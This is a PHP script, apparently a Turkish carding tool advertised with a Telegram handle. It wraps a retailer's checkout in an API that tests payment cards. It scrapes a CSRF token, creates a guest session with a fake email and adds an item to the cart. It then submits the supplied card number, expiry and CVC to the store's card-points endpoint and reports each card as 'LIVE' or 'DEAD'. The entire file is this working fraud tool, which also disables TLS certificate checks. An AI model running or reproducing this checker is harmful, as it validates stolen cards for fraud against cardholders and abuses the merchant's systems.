<?php
/**
 * telegram : @unutur
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// OPTIONS isteği için
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// GET ile bilgi
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo json_encode([
        'success' => true,
        'api' => 'Card Points API',
        'version' => '1.0',
        'endpoint' => 'POST /',
        'parameters' => [
            'card_number' => 'Kart numarası (16 hane)',
            'expire_month' => 'Son kullanma ayı (01-12)',
            'expire_year' => 'Son kullanma yılı (2024-2030)',
            'cvc' => 'CVC kodu (3-4 hane)'
        ],
        'example' => [
            'card_number' => '4289451234567897',
            'expire_month' => '12',
            'expire_year' => '2028',
            'cvc' => '123'
        ],
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit();
}

// POST ile kart sorgulama
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // JSON input al
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input) {
        // Form data da olabilir
        $input = $_POST;
    }
    
    $card_number = isset($input['card_number']) ? preg_replace('/[^0-9]/', '', $input['card_number']) : '';
    $expire_month = isset($input['expire_month']) ? str_pad($input['expire_month'], 2, '0', STR_PAD_LEFT) : '';
    $expire_year = isset($input['expire_year']) ? $input['expire_year'] : '';
    $cvc = isset($input['cvc']) ? $input['cvc'] : '';
    
    // Validasyon
    if (empty($card_number) || empty($expire_month) || empty($expire_year) || empty($cvc)) {
        echo json_encode([
            'success' => false,
            'error' => '❌ Eksik parametre',
            'required' => ['card_number', 'expire_month', 'expire_year', 'cvc'],
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit();
    }
    
    if (strlen($card_number) < 15 || strlen($card_number) > 16) {
        echo json_encode([
            'success' => false,
            'error' => '❌ Geçersiz kart numarası',
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit();
    }
    
    if ($expire_month < 1 || $expire_month > 12) {
        echo json_encode([
            'success' => false,
            'error' => '❌ Geçersiz ay',
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit();
    }
    
    if (strlen($expire_year) == 2) {
        $expire_year = '20' . $expire_year;
    }
    
    // Penti API'ye istek
    $penti_url = 'https://www.penti.com/tr/checkout/multi/delivery-address/cardPointInfo';
    
    // CSRF token al
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.penti.com/tr/checkout/multi/delivery-address/add');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $html = curl_exec($ch);
    curl_close($ch);
    
    preg_match('/name="CSRFToken" value="(.+?)"/', $html, $csrf_match);
    $csrf = $csrf_match[1] ?? '';
    
    // Guest giriş yap
    $guest_data = http_build_query([
        'email' => time() . rand(1000, 9999) . '@gmail.com',
        'CSRFToken' => $csrf
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.penti.com/tr/login/checkout/guest');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $guest_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_exec($ch);
    curl_close($ch);
    
    // Sepete ürün ekle
    $cart_data = http_build_query([
        'qty' => '1',
        'productCodePost' => 'PH7HC6N725SKWT8XL',
        'CSRFToken' => $csrf
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.penti.com/tr/cart/add');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $cart_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_exec($ch);
    curl_close($ch);
    
    // Puan sorgula
    $payload = [
        'cardNumber' => $card_number,
        'expireMonth' => $expire_month,
        'expireYear' => $expire_year,
        'cvc' => $cvc
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $penti_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'X-Requested-With: XMLHttpRequest',
        'Cookie: ' . implode('; ', file('cookies.txt', FILE_IGNORE_NEW_LINES) ?: [])
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    // Sonucu düzenle
    $point_amount = $data['pointAmount']['value'] ?? null;
    
    if ($http_code == 200 && $point_amount !== null && $point_amount > 0) {
        echo json_encode([
            'success' => true,
            'card_number' => substr($card_number, 0, 6) . '******' . substr($card_number, -4),
            'points' => $point_amount,
            'currency' => 'TL',
            'status' => 'LIVE',
            'message' => '✅ Kart geçerli ve puan var!',
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } elseif ($http_code == 200) {
        echo json_encode([
            'success' => true,
            'card_number' => substr($card_number, 0, 6) . '******' . substr($card_number, -4),
            'points' => 0,
            'currency' => 'TL',
            'status' => 'DEAD',
            'message' => '❌ Kart geçersiz veya puan yok',
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode([
            'success' => false,
            'error' => 'API hatası',
            'http_code' => $http_code,
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
    
    // Temizlik
    @unlink('cookies.txt');
}
?>